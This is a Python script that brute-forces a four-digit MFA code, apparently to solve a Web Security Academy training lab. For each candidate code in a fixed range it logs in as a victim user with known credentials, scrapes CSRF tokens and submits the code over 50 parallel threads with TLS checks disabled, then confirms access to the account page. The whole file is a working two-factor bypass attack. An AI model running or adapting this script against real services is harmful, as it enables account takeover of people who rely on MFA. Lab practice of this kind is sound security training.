import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# Suppress TLS warnings since we're using verify=False in the lab
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://0a95008c030e8d6f80aa8a980013000a.web-security-academy.net"

def attempt_code(code):
    """Run full login flow for one MFA code using a fresh session."""
    mfa_code = str(code).zfill(4)
    session = requests.Session()

    # Print the current code being tried
    print(f"[*] Trying MFA code: {mfa_code}")

    # Step 1: GET /login
    login_resp = session.get(base_url + "/login", verify=False)
    csrf_login = re.search(r'name="csrf" value="([^"]+)"', login_resp.text).group(1)

    # Step 2: POST /login
    login_data = {"csrf": csrf_login, "username": "carlos", "password": "montoya"}
    login_post = session.post(base_url + "/login", data=login_data,
                              allow_redirects=False, verify=False)

    if login_post.status_code != 302:
        return None

    # Step 3: GET /login2
    login2_resp = session.get(base_url + login_post.headers.get("Location"),
                              verify=False)
    csrf_mfa = re.search(r'name="csrf" value="([^"]+)"', login2_resp.text).group(1)

    # Step 4: POST /login2 with MFA code
    data = {"csrf": csrf_mfa, "mfa-code": mfa_code}
    resp = session.post(base_url + "/login2", data=data,
                        allow_redirects=True, verify=False)

    if "Incorrect" not in resp.text:
        # If valid, immediately request /my-account with the SAME session
        account_resp = session.get(base_url + "/my-account",
                                   allow_redirects=True,
                                   verify=False)

        # Collect debugging info
        status = account_resp.status_code
        redirections = account_resp.history  # list of Response objects if redirects occurred
        contains_carlos = "carlos" in account_resp.text.lower()

        return mfa_code, status, redirections, contains_carlos
    return None

# Run brute‑force in parallel
found = None
with ThreadPoolExecutor(max_workers=50) as executor:  # adjust worker count for speed
    futures = {executor.submit(attempt_code, code): code for code in range(1700, 1900)}
    for future in as_completed(futures):
        result = future.result()
        if result:
            found_code, status, redirections, contains_carlos = result
            print(f"[+] Found valid MFA code: {found_code}")
            print(f"[+] /my-account status: {status}")
            if redirections:
                print(f"[+] Redirections occurred: {[r.status_code for r in redirections]}")
            else:
                print("[+] No redirections")
            if contains_carlos:
                print("[+] 'carlos' found in /my-account response — lab should be solved!")
            else:
                print("[-] 'carlos' not found in /my-account response")
            executor.shutdown(cancel_futures=True)
            break